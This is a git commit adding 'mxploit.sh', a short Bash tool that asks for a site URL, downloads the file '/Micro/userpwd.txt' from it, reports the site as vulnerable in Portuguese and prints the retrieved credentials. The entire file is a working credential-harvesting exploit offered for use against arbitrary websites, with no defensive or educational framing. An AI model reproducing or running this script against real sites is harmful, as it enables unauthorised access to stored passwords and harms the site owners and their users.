8057ff01fe890548909b989e54501f467ea6d7b3
Derxs <derxshx11bx@gmail.com>
2016-08-25 22:15:50 -0300

    Add files via upload

---
+++ mxploit.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+echo "
+ __  __      ____  _       _ _
+|  \/  |_  _|  _ \| | ___ (_) |_
+| |\/| \ \/ / |_) | |/ _ \| | __|
+| |  | |>  <|  __/| | (_) | | |_
+|_|  |_/_/\_\_|   |_|\___/|_|\__|
+
+	By: Derxs
+"
+echo ""
+echo -n "URL: "
+read site
+curl $site/Micro/userpwd.txt > pass.txt
+if [ $? = 0 ]
+then
+	echo "O site é vulnerável!"
+	echo -n "Deseja continuar [s/n]? "
+	read cont
+	case $cont in
+		S | s)echo "";cat pass.txt;echo "";;
+		N | n)rm pass.txt;exit;;
+		    *)echo "Opção inválida!"; sleep 2; exit;;
+	esac
+else
+	echo "O site não é vulnerável!"
+	exit
+fi
